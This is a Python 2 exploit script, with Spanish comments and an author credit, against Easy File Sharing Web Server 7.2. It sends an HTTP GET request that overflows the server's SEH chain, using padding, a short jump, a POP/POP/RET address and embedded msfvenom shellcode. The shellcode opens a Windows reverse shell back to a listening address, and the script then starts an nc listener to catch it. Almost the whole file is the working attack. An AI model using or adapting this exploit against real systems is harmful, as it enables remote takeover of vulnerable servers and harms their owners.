#!/usr/bin/env python
# -*- coding:utf-8 -*-
import socket
import struct
import os
conexion=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

logo = """\n
	Script Attack Easy File Sharing Web Server 7.2
	Autor: Yonatan_Correa

	Twitter: @Yonatan_correa
	Blog: https://risataim.blogspot.com

"""
print logo
host = "192.168.0.14" #ip de la maquina virtual

junk = "\x41" * 4061
nseh = "\xEB\x06\x90\x90" #JMP SHORT 036A6FB4
seh = struct.pack('<I',0x100195f2)

# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp -e x86/alpha_mixed LHOST=192.168.0.18 LPORT=475 EXITFUNC=seh -f c
shell = ("\xd9\xeb\xd9\x74\x24\xf4\x5e\x56\x59\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x43\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41"
"\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"
"\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x49"
"\x6c\x6a\x48\x6f\x72\x43\x30\x45\x50\x45\x50\x31\x70\x4f\x79"
"\x48\x65\x36\x51\x49\x50\x72\x44\x4c\x4b\x50\x50\x76\x50\x4c"
"\x4b\x32\x72\x46\x6c\x6e\x6b\x63\x62\x35\x44\x6c\x4b\x62\x52"
"\x66\x48\x36\x6f\x58\x37\x72\x6a\x45\x76\x66\x51\x6b\x4f\x6e"
"\x4c\x37\x4c\x73\x51\x31\x6c\x64\x42\x56\x4c\x31\x30\x5a\x61"
"\x68\x4f\x36\x6d\x65\x51\x58\x47\x59\x72\x79\x62\x63\x62\x76"
"\x37\x6e\x6b\x72\x72\x56\x70\x4c\x4b\x73\x7a\x37\x4c\x4c\x4b"
"\x52\x6c\x56\x71\x70\x78\x7a\x43\x53\x78\x56\x61\x48\x51\x42"
"\x71\x4c\x4b\x63\x69\x35\x70\x75\x51\x48\x53\x6e\x6b\x30\x49"
"\x57\x68\x78\x63\x66\x5a\x77\x39\x6c\x4b\x76\x54\x4c\x4b\x76"
"\x61\x6b\x66\x50\x31\x4b\x4f\x6e\x4c\x5a\x61\x58\x4f\x46\x6d"
"\x47\x71\x6f\x37\x70\x38\x6d\x30\x43\x45\x6b\x46\x74\x43\x71"
"\x6d\x69\x68\x55\x6b\x71\x6d\x46\x44\x63\x45\x39\x74\x36\x38"
"\x6c\x4b\x32\x78\x71\x34\x53\x31\x4e\x33\x35\x36\x6c\x4b\x44"
"\x4c\x72\x6b\x4e\x6b\x72\x78\x75\x4c\x56\x61\x58\x53\x4e\x6b"
"\x37\x74\x6c\x4b\x66\x61\x48\x50\x6f\x79\x72\x64\x36\x44\x64"
"\x64\x73\x6b\x33\x6b\x73\x51\x62\x79\x61\x4a\x56\x31\x4b\x4f"
"\x49\x70\x33\x6f\x61\x4f\x71\x4a\x6c\x4b\x46\x72\x4a\x4b\x6c"
"\x4d\x31\x4d\x70\x68\x47\x43\x77\x42\x47\x70\x33\x30\x45\x38"
"\x43\x47\x34\x33\x30\x32\x51\x4f\x52\x74\x65\x38\x42\x6c\x54"
"\x37\x74\x66\x46\x67\x69\x6f\x68\x55\x68\x38\x4e\x70\x46\x61"
"\x33\x30\x45\x50\x34\x69\x78\x44\x50\x54\x66\x30\x43\x58\x71"
"\x39\x6f\x70\x62\x4b\x47\x70\x59\x6f\x79\x45\x32\x70\x42\x70"
"\x52\x70\x30\x50\x57\x30\x66\x30\x73\x70\x72\x70\x51\x78\x59"
"\x7a\x76\x6f\x6b\x6f\x6d\x30\x6b\x4f\x48\x55\x6f\x67\x33\x5a"
"\x55\x55\x51\x78\x49\x50\x49\x38\x45\x50\x34\x52\x61\x78\x75"
"\x52\x45\x50\x33\x31\x49\x4b\x4b\x39\x4a\x46\x63\x5a\x44\x50"
"\x36\x36\x50\x57\x55\x38\x6f\x69\x6d\x75\x52\x54\x45\x31\x49"
"\x6f\x49\x45\x4f\x75\x6b\x70\x73\x44\x66\x6c\x49\x6f\x62\x6e"
"\x44\x48\x30\x75\x6a\x4c\x72\x48\x6a\x50\x6c\x75\x69\x32\x73"
"\x66\x79\x6f\x68\x55\x73\x58\x33\x53\x42\x4d\x51\x74\x47\x70"
"\x6e\x69\x5a\x43\x63\x67\x61\x47\x50\x57\x64\x71\x78\x76\x63"
"\x5a\x32\x32\x70\x59\x73\x66\x4a\x42\x49\x6d\x55\x36\x4a\x67"
"\x67\x34\x66\x44\x65\x6c\x36\x61\x66\x61\x4c\x4d\x72\x64\x47"
"\x54\x76\x70\x6b\x76\x37\x70\x31\x54\x36\x34\x66\x30\x52\x76"
"\x70\x56\x31\x46\x53\x76\x50\x56\x52\x6e\x31\x46\x71\x46\x52"
"\x73\x76\x36\x45\x38\x73\x49\x68\x4c\x47\x4f\x4b\x36\x79\x6f"
"\x5a\x75\x6c\x49\x49\x70\x62\x6e\x66\x36\x51\x56\x79\x6f\x44"
"\x70\x75\x38\x45\x58\x6d\x57\x75\x4d\x75\x30\x6b\x4f\x49\x45"
"\x6f\x4b\x79\x6e\x74\x4e\x75\x62\x4b\x5a\x72\x48\x4d\x76\x4d"
"\x45\x4d\x6d\x4d\x4d\x4b\x4f\x68\x55\x35\x6c\x33\x36\x43\x4c"
"\x35\x5a\x6b\x30\x69\x6b\x39\x70\x33\x45\x53\x35\x4f\x4b\x30"
"\x47\x77\x63\x32\x52\x62\x4f\x33\x5a\x73\x30\x42\x73\x59\x6f"
"\x59\x45\x41\x41")

todo = junk + nseh + seh + shell

try:
	print "Enviando exploit"
	conexion.connect((host,80))

	buff = (
		"GET "+todo+ " HTTP/1.1\r\n"
		"Host:" + host + ":80\r\n\r\n")

	conexion.send(buff)
	conexion.close()
	print "\n Enviando ", len(buff)
	os.system("nc -lvp 475")

except:
	print "error de conexion"
